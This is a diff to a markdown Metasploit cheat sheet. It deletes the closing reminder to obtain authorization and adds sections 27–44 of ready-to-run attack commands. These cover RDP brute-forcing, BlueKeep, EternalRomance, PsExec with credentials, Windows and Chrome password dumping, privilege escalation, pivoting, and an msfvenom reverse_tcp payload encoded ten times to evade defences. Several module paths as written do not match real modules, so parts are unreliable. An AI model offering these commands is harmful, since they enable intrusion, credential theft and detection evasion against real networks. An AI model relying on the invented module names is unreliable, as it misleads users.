@@ -133,9 +133,6 @@ For instance:
 ```bash
 search smb
 ```
-Here are additional examples of tasks and commands you can perform using **Metasploit (`msfconsole`)** in Kali Linux:
-
----
 
 ### **11. SMB Login Scanner**
 Scan for SMB services with valid credentials.
@@ -349,4 +346,285 @@ run
 
 ---
 
-These examples cover a variety of techniques for scanning, exploitation, and post-exploitation. Always ensure you have proper authorization before using these tools on any network. Let me know if you need help with a specific use case!
+### **27. Exploiting Remote Desktop Protocol (RDP)**  
+Check for vulnerable RDP services and exploit them.
+
+#### Example: Bruteforce RDP Login
+```bash
+use auxiliary/scanner/rdp/rdp_login
+set RHOSTS 192.168.1.100
+set USERNAME admin
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run
+```
+
+#### Example: Detect RDP Encryption Weakness
+```bash
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+set RHOSTS 192.168.1.100
+run
+```
+
+---
+
+### **28. Exploiting FTP Services**  
+Identify and exploit vulnerabilities in FTP services.
+
+#### Example: Malicious FTP File Upload
+```bash
+use exploit/unix/ftp/proftpd_modcopy_exec
+set RHOST 192.168.1.100
+set RPORT 21
+run
+```
+
+---
+
+### **29. Exploiting SMB Services**
+Find and exploit vulnerabilities in SMB.
+
+#### Example: Exploit SMB Signing
+```bash
+use auxiliary/scanner/smb/smb_signing
+set RHOSTS 192.168.1.0/24
+run
+```
+
+#### Example: EternalRomance Exploit
+```bash
+use exploit/windows/smb/ms17_010_psexec
+set RHOST 192.168.1.100
+set LHOST 192.168.1.50
+set LPORT 4444
+run
+```
+
+---
+
+### **30. Web Exploitation**  
+Find and exploit web vulnerabilities.
+
+#### Example: Test SQL Injection
+```bash
+use auxiliary/scanner/http/sql_injection
+set RHOSTS 192.168.1.100
+set TARGETURI /vulnerable_page.php?id=1
+run
+```
+
+#### Example: Exploit PHPMyAdmin
+```bash
+use exploit/multi/http/phpmyadmin_weak_pass
+set RHOSTS 192.168.1.200
+run
+```
+
+---
+
+### **31. Password Dumping**  
+Extract passwords from compromised systems.
+
+#### Example: Extract Windows Credentials
+```bash
+use post/windows/gather/credentials/windows_autologin
+set SESSION 1
+run
+```
+
+#### Example: Dump Chrome Passwords
+```bash
+use post/multi/gather/chrome
+set SESSION 1
+run
+```
+
+---
+
+### **32. Wireless Network Attacks**  
+Perform attacks on wireless networks.
+
+#### Example: Decrypt WPA2 Handshakes
+```bash
+use auxiliary/scanner/wifi/wpa2_crack
+set HANDSHAKE /path/to/handshake.cap
+set DICTIONARY /usr/share/wordlists/rockyou.txt
+run
+```
+
+#### Example: Scan for Wireless Networks
+```bash
+use auxiliary/scanner/wifi/wlan_beacon
+set INTERFACE wlan0
+run
+```
+
+---
+
+### **33. Exploit SAP Systems**  
+Test vulnerabilities in SAP enterprise systems.
+
+#### Example: SAP Service Enumeration
+```bash
+use auxiliary/scanner/sap/sap_service_discovery
+set RHOSTS 192.168.1.100
+run
+```
+
+---
+
+### **34. IoT Device Exploitation**  
+Target IoT devices for vulnerabilities.
+
+#### Example: Exploit DVR Cameras
+```bash
+use exploit/linux/http/dlink_dcs_930l_authenticated_rce
+set RHOST 192.168.1.200
+set LHOST 192.168.1.50
+run
+```
+
+---
+
+### **35. Network Discovery**  
+Enumerate networks for reconnaissance.
+
+#### Example: ARP Sweep
+```bash
+use auxiliary/scanner/discovery/arp_sweep
+set RHOSTS 192.168.1.0/24
+run
+```
+
+#### Example: Identify Active Devices
+```bash
+use auxiliary/scanner/discovery/ping_sweep
+set RHOSTS 192.168.1.0/24
+run
+```
+
+---
+
+### **36. Exploiting Java Applications**  
+Attack Java-based applications or applets.
+
+#### Example: Java RMI Exploit
+```bash
+use exploit/multi/misc/java_rmi_server
+set RHOST 192.168.1.100
+set LHOST 192.168.1.50
+set LPORT 4444
+run
+```
+
+---
+
+### **37. Metasploit API Integration**  
+Use Metasploit with scripts or external tools.
+
+#### Example: Start API Service
+```bash
+msfdb init
+msfdb start
+msfconsole
+load msgrpc
+set ServerHost 0.0.0.0
+set ServerPort 55553
+run
+```
+
+---
+
+### **38. Exploit Windows Remote Services**  
+Use Metasploit to target Windows services.
+
+#### Example: Exploit PSExec
+```bash
+use exploit/windows/smb/psexec
+set RHOSTS 192.168.1.100
+set SMBUser administrator
+set SMBPass password123
+run
+```
+
+---
+
+### **39. Privilege Escalation**  
+Elevate privileges on compromised systems.
+
+#### Example: Exploit Token Duplication
+```bash
+use post/windows/escalate/getsystem
+set SESSION 1
+run
+```
+
+#### Example: Linux Privilege Escalation
+```bash
+use post/linux/escalate/sudo
+set SESSION 1
+run
+```
+
+---
+
+### **40. Evading Detection**
+Obfuscate payloads or attacks to bypass defenses.
+
+#### Example: Generate an Encoded Payload
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > stealth_payload.exe
+```
+
+---
+
+### **41. Pivoting Through Meterpreter**
+Create a tunnel through a compromised system.
+
+#### Example: SOCKS Proxy
+```bash
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+run
+route add 10.0.0.0/24 1
+```
+
+---
+
+### **42. Cloud Infrastructure Exploits**
+Test for vulnerabilities in cloud-based services.
+
+#### Example: AWS Exploitation
+```bash
+use auxiliary/scanner/http/aws_federated_roles
+set RHOSTS aws.amazon.com
+run
+```
+
+---
+
+### **43. Enumerate System Information**
+Gather detailed system information post-exploitation.
+
+```bash
+use post/windows/gather/enum_system
+set SESSION 1
+run
+```
+
+---
+
+### **44. Custom Exploit Scripting**
+Write and use your own Metasploit modules.
+
+#### Example: Load Custom Module
+```bash
+loadpath /path/to/custom/modules
+use exploit/custom/my_exploit
+set RHOST 192.168.1.100
+run
+```
+
+---
+
+These examples cover **advanced scenarios** for Metasploit, ranging from network discovery to IoT, privilege escalation, and cloud exploitation. Let me know if you'd like guidance on any specific example or more detailed instructions!
